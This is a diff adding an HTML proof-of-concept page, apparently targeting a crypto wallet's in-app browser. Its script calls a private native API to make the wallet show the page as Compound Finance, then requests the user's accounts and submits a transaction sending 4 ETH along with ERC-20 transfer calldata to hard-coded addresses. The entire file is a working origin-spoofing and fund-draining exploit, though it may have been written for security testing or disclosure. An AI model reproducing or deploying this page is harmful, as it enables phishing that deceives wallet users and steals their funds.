@@ -1,0 +1,38 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Origin and transaction binding probe</title>
+<style>
+body{font:16px system-ui;margin:18px;background:#10151c;color:#edf4ff}
+pre{white-space:pre-wrap;word-break:break-all;background:#1c2633;padding:12px;border-radius:8px}
+</style>
+<h2>Origin and transaction binding probe</h2>
+<p>The actual document URL is printed below.</p>
+<pre id="actual"></pre><pre id="state">Waiting for the injected provider…</pre>
+<script>
+actual.textContent=location.href;
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+async function run(){
+  while(!window.imToken?.callAPI || !window.ethereum?.request) await sleep(100);
+  imToken.callAPI('private.historyChange',{
+    url:'https://app.compound.finance/',
+    title:'Compound',
+    loading:false,
+    canGoBack:false,
+    canGoForward:false
+  });
+  state.textContent='Actual origin: '+location.origin+'\nNative identity changed; requesting wallet access.';
+  await sleep(800);
+  try{
+    const accounts=await ethereum.request({method:'eth_requestAccounts'});
+    state.textContent='Actual document: '+location.href+'\nSubmitting controlled transaction from '+accounts[0];
+    await ethereum.request({method:'eth_sendTransaction',params:[{
+      from:accounts[0],
+      to:'0x3333333333333333333333333333333333333333',
+      value:'0x3782dace9d900000',
+      data:'0xa9059cbb000000000000000000000000e2d4ae80af5347ebe2a6d964a89245c58bfed3cd00000000000000000000000000000000000000000000003627e8f712373c0000'
+    }]});
+  }catch(e){state.textContent+='\nResult: '+(e?.message||String(e))}
+}
+run();
+</script>
